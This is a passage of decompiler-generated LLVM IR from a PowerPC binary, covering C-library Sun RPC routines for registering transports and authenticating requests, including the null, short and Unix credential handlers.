  %v1_10012e20 = load i32, i32* @r31, align 4
  %v2_10012e20 = add i32 %v1_10012e20, 180
  %v3_10012e20 = inttoptr i32 %v2_10012e20 to i32*
  store i32 %v0_10012e18, i32* %v3_10012e20, align 4
  br i1 %v3_10012e1c, label %dec_label_pc_10012f0c, label %dec_label_pc_10012e28

dec_label_pc_10012e28:                            ; preds = %entry, %dec_label_pc_10012e10
  store i32 268512812, i32* @lr, align 4
  %v0_10012e28 = call i32 @_rpc_dtablesize()
  store i32 %v0_10012e28, i32* %r3.global-to-local, align 4
  %v2_10012e2c = icmp slt i32 %v2_10012e04, %v0_10012e28
  br i1 %v2_10012e2c, label %dec_label_pc_10012e34, label %dec_label_pc_10012f0c

dec_label_pc_10012e34:                            ; preds = %dec_label_pc_10012e28
  %v2_10012e34 = icmp sgt i32 %v2_10012e04, 1023
  %v0_10012e38 = load i32, i32* @r31, align 4
  %v1_10012e38 = add i32 %v0_10012e38, 180
  %v2_10012e38 = inttoptr i32 %v1_10012e38 to i32*
  %v3_10012e38 = load i32, i32* %v2_10012e38, align 4
  %v1_10012e3c = mul i32 %v2_10012e04, 4
  store i32 %v1_10012e3c, i32* %r9.global-to-local, align 4
  %v0_10012e40 = load i32, i32* @r30, align 4
  %v3_10012e40 = add i32 %v3_10012e38, %v1_10012e3c
  %v4_10012e40 = inttoptr i32 %v3_10012e40 to i32*
  store i32 %v0_10012e40, i32* %v4_10012e40, align 4
  br i1 %v2_10012e34, label %dec_label_pc_10012e68, label %dec_label_pc_10012e48

dec_label_pc_10012e48:                            ; preds = %dec_label_pc_10012e34
  store i32 268512844, i32* @lr, align 4
  %v0_10012e48 = load i32, i32* %r3.global-to-local, align 4
  %v2_10012e48 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_10012e48, i32 %v1_10012e3c)
  store i32 %v2_10012e48, i32* %r3.global-to-local, align 4
  %v1_10012e4c = call i32 @__asm_rlwinm(i32 %v2_10012e04, i32 29, i32 3, i32 29)
  store i32 %v1_10012e4c, i32* @r10, align 4
  %v2_10012e50 = add i32 %v1_10012e4c, %v2_10012e48
  %v3_10012e50 = inttoptr i32 %v2_10012e50 to i32*
  %v4_10012e50 = load i32, i32* %v3_10012e50, align 4
  %v1_10012e54 = urem i32 %v2_10012e04, 32
  %v3_10012e5c = shl i32 1, %v1_10012e54
  %v2_10012e60 = or i32 %v4_10012e50, %v3_10012e5c
  store i32 %v2_10012e60, i32* %r9.global-to-local, align 4
  store i32 %v2_10012e60, i32* %v3_10012e50, align 4
  br label %dec_label_pc_10012e68

dec_label_pc_10012e68:                            ; preds = %dec_label_pc_10012e34, %dec_label_pc_10012e48
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10012ea8

dec_label_pc_10012e70:                            ; preds = %dec_label_pc_10012ea8
  store i32 268512884, i32* @lr, align 4
  %v0_10012e70 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10012e70, i32* %r3.global-to-local, align 4
  %v1_10012e74 = inttoptr i32 %v0_10012e70 to i32*
  %v2_10012e74 = load i32, i32* %v1_10012e74, align 4
  store i32 %v0_10012e70, i32* %r9.global-to-local, align 4
  %v0_10012e7c = load i32, i32* @r31, align 4
  %v1_10012e7c = mul i32 %v0_10012e7c, 8
  store i32 %v1_10012e7c, i32* %r3.global-to-local, align 4
  %v1_10012e80 = add i32 %v0_10012e7c, 1
  store i32 %v1_10012e80, i32* @r31, align 4
  %v2_10012e84 = add i32 %v1_10012e7c, %v2_10012e74
  %v3_10012e84 = inttoptr i32 %v2_10012e84 to i32*
  %v4_10012e84 = load i32, i32* %v3_10012e84, align 4
  %v3_10012e88 = icmp eq i32 %v4_10012e84, -1
  br i1 %v3_10012e88, label %dec_label_pc_10012e90, label %dec_label_pc_10012ea8

dec_label_pc_10012e90:                            ; preds = %dec_label_pc_10012e70
  store i32 %v2_10012e04, i32* %v3_10012e84, align 4
  %v0_10012e98 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012e98 = inttoptr i32 %v0_10012e98 to i32*
  %v2_10012e98 = load i32, i32* %v1_10012e98, align 4
  %v1_10012e9c = load i32, i32* %r3.global-to-local, align 4
  %v2_10012e9c = add i32 %v1_10012e9c, %v2_10012e98
  store i32 %v2_10012e9c, i32* %r9.global-to-local, align 4
  %v3_10012ea0 = add i32 %v2_10012e9c, 4
  %v4_10012ea0 = inttoptr i32 %v3_10012ea0 to i16*
  store i16 195, i16* %v4_10012ea0, align 2
  br label %dec_label_pc_10012f0c

dec_label_pc_10012ea8:                            ; preds = %dec_label_pc_10012e70, %dec_label_pc_10012e68
  store i32 268512940, i32* @lr, align 4
  %v0_10012ea8 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10012ea8, i32* %r3.global-to-local, align 4
  %v1_10012eac = inttoptr i32 %v0_10012ea8 to i32*
  %v2_10012eac = load i32, i32* %v1_10012eac, align 4
  store i32 %v0_10012ea8, i32* @r30, align 4
  %v0_10012eb4 = load i32, i32* @r31, align 4
  %v2_10012eb4 = icmp slt i32 %v0_10012eb4, %v2_10012eac
  br i1 %v2_10012eb4, label %dec_label_pc_10012e70, label %dec_label_pc_10012ebc

dec_label_pc_10012ebc:                            ; preds = %dec_label_pc_10012ea8
  %v1_10012ebc = add i32 %v2_10012eac, 1
  store i32 %v1_10012ebc, i32* @r29, align 4
  store i32 %v1_10012ebc, i32* %v1_10012eac, align 4
  store i32 268512968, i32* @lr, align 4
  %v0_10012ec4 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10012ec4, i32* %r3.global-to-local, align 4
  %v0_10012ec8 = load i32, i32* @r29, align 4
  %v1_10012ec8 = mul i32 %v0_10012ec8, 8
  %v1_10012ed0 = inttoptr i32 %v0_10012ec4 to i32*
  %v2_10012ed0 = load i32, i32* %v1_10012ed0, align 4
  store i32 %v2_10012ed0, i32* %r3.global-to-local, align 4
  store i32 268512984, i32* @lr, align 4
  %v2_10012ed4 = call i32 @realloc(i32 %v2_10012ed0, i32 %v1_10012ec8)
  store i32 %v2_10012ed4, i32* %r3.global-to-local, align 4
  %v3_10012ed8 = icmp eq i32 %v2_10012ed4, 0
  %v1_10012edc = load i32, i32* @r31, align 4
  %v2_10012edc = inttoptr i32 %v1_10012edc to i32*
  store i32 %v2_10012ed4, i32* %v2_10012edc, align 4
  br i1 %v3_10012ed8, label %dec_label_pc_10012f0c, label %dec_label_pc_10012ee4

dec_label_pc_10012ee4:                            ; preds = %dec_label_pc_10012ebc
  %v0_10012ee4 = load i32, i32* @r30, align 4
  %v1_10012ee4 = inttoptr i32 %v0_10012ee4 to i32*
  %v2_10012ee4 = load i32, i32* %v1_10012ee4, align 4
  %v1_10012ee8 = mul i32 %v2_10012ee4, 8
  %v1_10012eec = load i32, i32* %r3.global-to-local, align 4
  %v2_10012eec = add i32 %v1_10012eec, %v1_10012ee8
  store i32 %v2_10012eec, i32* %r9.global-to-local, align 4
  %v2_10012ef0 = add i32 %v2_10012eec, -8
  %v3_10012ef0 = inttoptr i32 %v2_10012ef0 to i32*
  store i32 %v2_10012e04, i32* %v3_10012ef0, align 4
  %v0_10012ef4 = load i32, i32* @r30, align 4
  %v1_10012ef4 = inttoptr i32 %v0_10012ef4 to i32*
  %v2_10012ef4 = load i32, i32* %v1_10012ef4, align 4
  store i32 %v2_10012ef4, i32* %r9.global-to-local, align 4
  %v0_10012ef8 = load i32, i32* @r31, align 4
  %v1_10012ef8 = inttoptr i32 %v0_10012ef8 to i32*
  %v2_10012ef8 = load i32, i32* %v1_10012ef8, align 4
  %v1_10012efc = mul i32 %v2_10012ef4, 8
  %v2_10012f00 = add i32 %v2_10012ef8, %v1_10012efc
  store i32 %v2_10012f00, i32* %r9.global-to-local, align 4
  %v3_10012f08 = add i32 %v2_10012f00, -4
  %v4_10012f08 = inttoptr i32 %v3_10012f08 to i16*
  store i16 195, i16* %v4_10012f08, align 2
  br label %dec_label_pc_10012f0c

dec_label_pc_10012f0c:                            ; preds = %dec_label_pc_10012e28, %dec_label_pc_10012ebc, %dec_label_pc_10012e10, %dec_label_pc_10012e90, %dec_label_pc_10012ee4
  %v0_10012f1c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012f1c

; uselistorder directives
  uselistorder i32 %v1_10012e7c, { 1, 0 }
  uselistorder i32 %v0_10012e7c, { 1, 0 }
  uselistorder i32 %v1_10012e3c, { 1, 2, 0 }
  uselistorder i32 %v2_10012e04, { 6, 3, 0, 4, 1, 5, 2 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 11, 13, 14, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 3, 2, 1, 0 }
  uselistorder i16 195, { 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1023, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 ()* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10012f0c, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_10012e68, { 1, 0 }
  uselistorder label %dec_label_pc_10012e28, { 1, 0 }
}

define i32 @_authenticate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10012f28 = add i32 %arg1, 12
  %v1_10012f2c = add i32 %arg2, 24
  store i32 %v1_10012f2c, i32* @r10, align 4
  %v3_10012f40 = load i32, i32* @global_var_10033c00.494, align 4
  %v1_10012f44 = add i32 %arg1, 28
  %v2_10012f44 = inttoptr i32 %v1_10012f44 to i32*
  %v3_10012f44 = load i32, i32* %v2_10012f44, align 4
  %v2_10012f48 = add i32 %v3_10012f44, 32
  %v3_10012f48 = inttoptr i32 %v2_10012f48 to i32*
  store i32 %v3_10012f40, i32* %v3_10012f48, align 4
  %v2_10012f4c = inttoptr i32 %v1_10012f28 to i32*
  %v3_10012f4c = load i32, i32* %v2_10012f4c, align 4
  %v3_10012f50 = load i32, i32* %v2_10012f44, align 4
  %v1_10012f58 = mul i32 %v3_10012f4c, 4
  store i32 %v1_10012f58, i32* %r11.global-to-local, align 4
  %v2_10012f60 = add i32 %v3_10012f50, 40
  %v3_10012f60 = inttoptr i32 %v2_10012f60 to i32*
  store i32 0, i32* %v3_10012f60, align 4
  %v0_10012f74 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012f74 = add i32 %v0_10012f74, ptrtoint (i32* @global_var_1001a004.513 to i32)
  %v3_10012f74 = inttoptr i32 %v2_10012f74 to i32*
  %v4_10012f74 = load i32, i32* %v3_10012f74, align 4
  store i32 %v4_10012f74, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_10012f74)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10012fa8 = load i32, i32* @lr, align 4
  store i32 %v0_10012fa8, i32* %r0.global-to-local, align 4
  %v2_10012fb8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10012fb8, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 %arg1, i32* @r26, align 4
  %v1_10012fc8 = add i32 %arg1, 24
  %v2_10012fc8 = inttoptr i32 %v1_10012fc8 to i32*
  %v3_10012fc8 = load i32, i32* %v2_10012fc8, align 4
  store i32 %v3_10012fc8, i32* %r30.global-to-local, align 4
  store i32 %v2_10012fb8, i32* %r3.global-to-local, align 4
  %v1_10012fd0 = add i32 %v3_10012fc8, 24
  store i32 %v1_10012fd0, i32* %r0.global-to-local, align 4
  %v1_10012fd4 = add i32 %v3_10012fc8, 280
  store i32 %v1_10012fd4, i32* %r9.global-to-local, align 4
  %v2_10012fd8 = add i32 %v3_10012fc8, 4
  %v3_10012fd8 = inttoptr i32 %v2_10012fd8 to i32*
  store i32 %v1_10012fd0, i32* %v3_10012fd8, align 4
  %v0_10012fdc = load i32, i32* %r9.global-to-local, align 4
  %v1_10012fdc = load i32, i32* %r30.global-to-local, align 4
  %v2_10012fdc = add i32 %v1_10012fdc, 20
  %v3_10012fdc = inttoptr i32 %v2_10012fdc to i32*
  store i32 %v0_10012fdc, i32* %v3_10012fdc, align 4
  %v1_10012fe0 = add i32 %arg2, 32
  %v2_10012fe0 = inttoptr i32 %v1_10012fe0 to i32*
  %v3_10012fe0 = load i32, i32* %v2_10012fe0, align 4
  store i32 %v3_10012fe0, i32* %r27.global-to-local, align 4
  %v1_10012fe4 = add i32 %arg2, 28
  %v2_10012fe4 = inttoptr i32 %v1_10012fe4 to i32*
  %v3_10012fe4 = load i32, i32* %v2_10012fe4, align 4
  %v5_10012fec = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v3_10012fe4, i32 %v3_10012fe0, i32 1)
  %v3_10012ff0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10012ff0, i32* %r9.global-to-local, align 4
  store i32 %v2_10012fb8, i32* %r3.global-to-local, align 4
  %v1_10012ffc = add i32 %v3_10012ff0, 24
  %v2_10012ffc = inttoptr i32 %v1_10012ffc to i32*
  %v3_10012ffc = load i32, i32* %v2_10012ffc, align 4
  store i32 %v3_10012ffc, i32* %r9.global-to-local, align 4
  store i32 %v3_10012ffc, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10012ffc)
  %v0_10013008 = load i32, i32* %r3.global-to-local, align 4
  %v3_10013008 = icmp eq i32 %v0_10013008, 0
  br i1 %v3_10013008, label %dec_label_pc_100130e8, label %dec_label_pc_10013010

dec_label_pc_10013010:                            ; preds = %entry
  %v2_10013010 = load i32, i32* %stack_var_-56, align 4
  store i32 %v2_10013010, i32* %r0.global-to-local, align 4
  %v2_10013014 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10013014, i32* %r29.global-to-local, align 4
  %v1_10013018 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013018 = inttoptr i32 %v1_10013018 to i32*
  store i32 %v2_10013010, i32* %v2_10013018, align 4
  %v3_1001301c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_1001301c, i32* %r31.global-to-local, align 4
  %v2_10013020 = icmp ugt i32 %v3_1001301c, 255
  br i1 %v2_10013020, label %dec_label_pc_10013154, label %dec_label_pc_10013028

dec_label_pc_10013028:                            ; preds = %dec_label_pc_10013010
  %v2_10013028 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10013028, i32* %r29.global-to-local, align 4
  %v0_1001302c = load i32, i32* %r30.global-to-local, align 4
  %v1_1001302c = add i32 %v0_1001302c, 4
  %v2_1001302c = inttoptr i32 %v1_1001302c to i32*
  %v3_1001302c = load i32, i32* %v2_1001302c, align 4
  store i32 %v3_1001302c, i32* @r3, align 4
  store i32 %v2_10013028, i32* @r4, align 4
  store i32 %v3_1001301c, i32* @r5, align 4
  store i32 268513340, i32* @lr, align 4
  %v0_10013038 = call i32 @memcpy()
  store i32 %v0_10013038, i32* %r3.global-to-local, align 4
  %v0_1001303c = load i32, i32* %r30.global-to-local, align 4
  %v1_1001303c = add i32 %v0_1001303c, 4
  %v2_1001303c = inttoptr i32 %v1_1001303c to i32*
  %v3_1001303c = load i32, i32* %v2_1001303c, align 4
  store i32 %v3_1001303c, i32* %r9.global-to-local, align 4
  %v2_10013044 = load i32, i32* %r31.global-to-local, align 4
  %v4_10013044 = add i32 %v2_10013044, %v3_1001303c
  %v5_10013044 = inttoptr i32 %v4_10013044 to i8*
  store i8 0, i8* %v5_10013044, align 1
  %v0_10013048 = load i32, i32* %r31.global-to-local, align 4
  %v1_10013048 = add i32 %v0_10013048, 3
  store i32 %v1_10013048, i32* %r0.global-to-local, align 4
  %v1_1001304c = call i32 @__asm_rlwinm(i32 %v1_10013048, i32 0, i32 0, i32 29)
  %v0_10013050 = load i32, i32* %r29.global-to-local, align 4
  %v2_10013050 = add i32 %v0_10013050, %v1_1001304c
  %v3_10013050 = inttoptr i32 %v2_10013050 to i32*
  %v4_10013050 = load i32, i32* %v3_10013050, align 4
  store i32 %v4_10013050, i32* %r0.global-to-local, align 4
  store i32 %v2_10013050, i32* %r29.global-to-local, align 4
  %v1_10013058 = add i32 %v2_10013050, 4
  store i32 %v1_10013058, i32* %r9.global-to-local, align 4
  %v1_1001305c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001305c = add i32 %v1_1001305c, 8
  %v3_1001305c = inttoptr i32 %v2_1001305c to i32*
  store i32 %v4_10013050, i32* %v3_1001305c, align 4
  %v0_10013060 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013060 = add i32 %v0_10013060, 4
  store i32 %v1_10013060, i32* %r11.global-to-local, align 4
  %v0_10013064 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013064 = add i32 %v0_10013064, 4
  %v2_10013064 = inttoptr i32 %v1_10013064 to i32*
  %v3_10013064 = load i32, i32* %v2_10013064, align 4
  store i32 %v3_10013064, i32* %r0.global-to-local, align 4
  %v1_10013068 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013068 = add i32 %v1_10013068, 12
  %v3_10013068 = inttoptr i32 %v2_10013068 to i32*
  store i32 %v3_10013064, i32* %v3_10013068, align 4
  %v0_1001306c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001306c = add i32 %v0_1001306c, 4
  %v2_1001306c = inttoptr i32 %v1_1001306c to i32*
  %v3_1001306c = load i32, i32* %v2_1001306c, align 4
  %v2_10013070 = icmp ugt i32 %v3_1001306c, 16
  br i1 %v2_10013070, label %dec_label_pc_10013154, label %dec_label_pc_10013078

dec_label_pc_10013078:                            ; preds = %dec_label_pc_10013028
  %v3_10013078 = icmp eq i32 %v3_1001306c, 0
  %v1_1001307c = add i32 %v3_1001306c, 1
  store i32 %v1_1001307c, i32* %r0.global-to-local, align 4
  %v0_10013080 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013080 = add i32 %v0_10013080, 4
  store i32 %v1_10013080, i32* %r11.global-to-local, align 4
  %v1_10013084 = load i32, i32* %r30.global-to-local, align 4
  %v2_10013084 = add i32 %v1_10013084, 16
  %v3_10013084 = inttoptr i32 %v2_10013084 to i32*
  store i32 %v3_1001306c, i32* %v3_10013084, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v0_1001308c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1001308c, i32* %ctr.global-to-local, align 4
  br i1 %v3_10013078, label %dec_label_pc_100130b0.preheader.thread, label %dec_label_pc_100130b0.preheader

dec_label_pc_100130b0.preheader.thread:           ; preds = %dec_label_pc_10013078
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100130bc

dec_label_pc_100130b0.preheader:                  ; preds = %dec_label_pc_10013078
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_100130b85 = add i32 %v0_1001308c, -1
  store i32 %v1_100130b85, i32* %ctr.global-to-local, align 4
  %v2_100130b86 = icmp eq i32 %v1_100130b85, 0
  br i1 %v2_100130b86, label %dec_label_pc_100130bc, label %dec_label_pc_100130a0

dec_label_pc_100130a0:                            ; preds = %dec_label_pc_100130b0.preheader, %dec_label_pc_100130a0
  %v1_100130ac = phi i32 [ %v1_100130b0, %dec_label_pc_100130a0 ], [ 0, %dec_label_pc_100130b0.preheader ]
  %v0_100130a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100130a0 = inttoptr i32 %v0_100130a0 to i32*
  %v2_100130a0 = load i32, i32* %v1_100130a0, align 4
  store i32 %v2_100130a0, i32* %r0.global-to-local, align 4
  %v1_100130a4 = add i32 %v0_100130a0, 4
  store i32 %v1_100130a4, i32* %r11.global-to-local, align 4
  %v0_100130a8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100130a8 = add i32 %v0_100130a8, 20
  %v2_100130a8 = inttoptr i32 %v1_100130a8 to i32*
  %v3_100130a8 = load i32, i32* %v2_100130a8, align 4
  store i32 %v3_100130a8, i32* %r9.global-to-local, align 4
  %v3_100130ac = add i32 %v3_100130a8, %v1_100130ac
  %v4_100130ac = inttoptr i32 %v3_100130ac to i32*
  store i32 %v2_100130a0, i32* %v4_100130ac, align 4
  %v0_100130b0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100130b0 = mul i32 %v0_100130b0, 4
  %v1_100130b4 = add i32 %v0_100130b0, 1
  store i32 %v1_100130b4, i32* %r10.global-to-local, align 4
  %v0_100130b8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100130b8 = add i32 %v0_100130b8, -1
  store i32 %v1_100130b8, i32* %ctr.global-to-local, align 4
  %v2_100130b8 = icmp eq i32 %v1_100130b8, 0
  br i1 %v2_100130b8, label %dec_label_pc_100130bc, label %dec_label_pc_100130a0

dec_label_pc_100130bc:                            ; preds = %dec_label_pc_100130a0, %dec_label_pc_100130b0.preheader.thread, %dec_label_pc_100130b0.preheader
  %v1_100130bc = mul i32 %v3_1001306c, 4
  %v1_100130c0 = add i32 %v1_1001304c, 20
  store i32 %v1_100130c0, i32* %r9.global-to-local, align 4
  %v2_100130c4 = add i32 %v1_100130bc, %v1_100130c0
  store i32 %v2_100130c4, i32* %r0.global-to-local, align 4
  %v1_100130c8 = load i32, i32* %r27.global-to-local, align 4
  %v3_100130c8 = icmp ugt i32 %v2_100130c4, %v1_100130c8
  br i1 %v3_100130c8, label %dec_label_pc_100130d0, label %dec_label_pc_10013114

dec_label_pc_100130d0:                            ; preds = %dec_label_pc_100130bc
  store i32 ptrtoint ([36 x i8]* @global_var_1001a010.514 to i32), i32* %r3.global-to-local, align 4
  %v6_100130e0 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_1001a010.514, i32 0, i32 0), i32 %v3_1001306c, i32 %v1_1001304c, i32 %v1_100130c8)
  store i32 %v6_100130e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013154

dec_label_pc_100130e8:                            ; preds = %entry
  store i32 %v2_10012fb8, i32* %r3.global-to-local, align 4
  %v0_100130ec = load i32, i32* %r30.global-to-local, align 4
  store i32 268513524, i32* @lr, align 4
  %v3_100130f0 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_100130ec)
  store i32 %v3_100130f0, i32* %r3.global-to-local, align 4
  %v3_100130f4 = icmp eq i32 %v3_100130f0, 0
  br i1 %v3_100130f4, label %dec_label_pc_100130fc, label %dec_label_pc_10013114

dec_label_pc_100130fc:                            ; preds = %dec_label_pc_100130e8
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v2_10012fb8, i32* %r3.global-to-local, align 4
  %v0_10013104 = load i32, i32* @r30, align 4
  store i32 2, i32* %stack_var_-56, align 4
  store i32 ptrtoint (i32* @global_var_10013110.516 to i32), i32* @lr, align 4
  %v3_1001310c = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_10013104)
  store i32 %v3_1001310c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013154

dec_label_pc_10013114:                            ; preds = %dec_label_pc_100130e8, %dec_label_pc_100130bc
  %v0_10013114 = load i32, i32* @r28, align 4
  %v1_10013114 = add i32 %v0_10013114, 44
  %v2_10013114 = inttoptr i32 %v1_10013114 to i32*
  %v3_10013114 = load i32, i32* %v2_10013114, align 4
  store i32 %v3_10013114, i32* %r10.global-to-local, align 4
  %v0_10013118 = load i32, i32* @r26, align 4
  %v1_10013118 = add i32 %v0_10013118, 28
  %v2_10013118 = inttoptr i32 %v1_10013118 to i32*
  %v3_10013118 = load i32, i32* %v2_10013118, align 4
  store i32 %v3_10013118, i32* %r9.global-to-local, align 4
  %v3_1001311c = icmp eq i32 %v3_10013114, 0
  br i1 %v3_1001311c, label %dec_label_pc_10013140, label %dec_label_pc_10013124

dec_label_pc_10013124:                            ; preds = %dec_label_pc_10013114
  %v1_10013124 = add i32 %v0_10013114, 36
  %v2_10013124 = inttoptr i32 %v1_10013124 to i32*
  %v3_10013124 = load i32, i32* %v2_10013124, align 4
  store i32 %v3_10013124, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_1001312c = add i32 %v0_10013114, 40
  %v2_1001312c = inttoptr i32 %v1_1001312c to i32*
  %v3_1001312c = load i32, i32* %v2_1001312c, align 4
  store i32 %v3_1001312c, i32* %r11.global-to-local, align 4
  %v2_10013130 = add i32 %v3_10013118, 32
  %v3_10013130 = inttoptr i32 %v2_10013130 to i32*
  store i32 %v3_10013124, i32* %v3_10013130, align 4
  %v0_10013134 = load i32, i32* @r26, align 4
  %v1_10013134 = add i32 %v0_10013134, 28
  %v2_10013134 = inttoptr i32 %v1_10013134 to i32*
  %v3_10013134 = load i32, i32* %v2_10013134, align 4
  store i32 %v3_10013134, i32* %r9.global-to-local, align 4
  %v0_10013138 = load i32, i32* %r11.global-to-local, align 4
  %v2_10013138 = add i32 %v3_10013134, 36
  %v3_10013138 = inttoptr i32 %v2_10013138 to i32*
  store i32 %v0_10013138, i32* %v3_10013138, align 4
  br label %dec_label_pc_10013148

dec_label_pc_10013140:                            ; preds = %dec_label_pc_10013114
  %v2_10013140 = add i32 %v3_10013118, 32
  %v3_10013140 = inttoptr i32 %v2_10013140 to i32*
  store i32 0, i32* %v3_10013140, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013148

dec_label_pc_10013148:                            ; preds = %dec_label_pc_10013124, %dec_label_pc_10013140
  %v0_10013148 = load i32, i32* @r26, align 4
  %v1_10013148 = add i32 %v0_10013148, 28
  %v2_10013148 = inttoptr i32 %v1_10013148 to i32*
  %v3_10013148 = load i32, i32* %v2_10013148, align 4
  store i32 %v3_10013148, i32* %r9.global-to-local, align 4
  %v0_1001314c = load i32, i32* %r10.global-to-local, align 4
  %v2_1001314c = add i32 %v3_10013148, 40
  %v3_1001314c = inttoptr i32 %v2_1001314c to i32*
  store i32 %v0_1001314c, i32* %v3_1001314c, align 4
  br label %dec_label_pc_10013158

dec_label_pc_10013154:                            ; preds = %dec_label_pc_10013028, %dec_label_pc_10013010, %dec_label_pc_100130fc, %dec_label_pc_100130d0
  store i32 1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013158

dec_label_pc_10013158:                            ; preds = %dec_label_pc_10013148, %dec_label_pc_10013154
  %v3_10013158 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10013158, i32* %r9.global-to-local, align 4
  %v1_1001315c = add i32 %v3_10013158, 28
  %v2_1001315c = inttoptr i32 %v1_1001315c to i32*
  %v3_1001315c = load i32, i32* %v2_1001315c, align 4
  store i32 %v3_1001315c, i32* %r0.global-to-local, align 4
  %v3_10013160 = icmp eq i32 %v3_1001315c, 0
  br i1 %v3_10013160, label %dec_label_pc_10013174, label %dec_label_pc_10013168

dec_label_pc_10013168:                            ; preds = %dec_label_pc_10013158
  store i32 %v2_10012fb8, i32* %r3.global-to-local, align 4
  store i32 %v3_1001315c, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_1001315c)
  br label %dec_label_pc_10013174

dec_label_pc_10013174:                            ; preds = %dec_label_pc_10013158, %dec_label_pc_10013168
  store i32 %v0_10012fa8, i32* %r0.global-to-local, align 4
  %v0_10013178 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10013178, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013178

; uselistorder directives
  uselistorder i32 %v3_1001315c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10013114, { 1, 0, 2 }
  uselistorder i32 %v1_100130b8, { 1, 0 }
  uselistorder i32 %v0_100130b0, { 1, 0 }
  uselistorder i32 %v3_1001306c, { 3, 0, 2, 1, 4, 5 }
  uselistorder i32 %v2_10013050, { 1, 0, 2 }
  uselistorder i32 %v1_1001304c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32* %stack_var_-52, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %ctr.global-to-local, { 0, 1, 4, 5, 6, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013174, { 1, 0 }
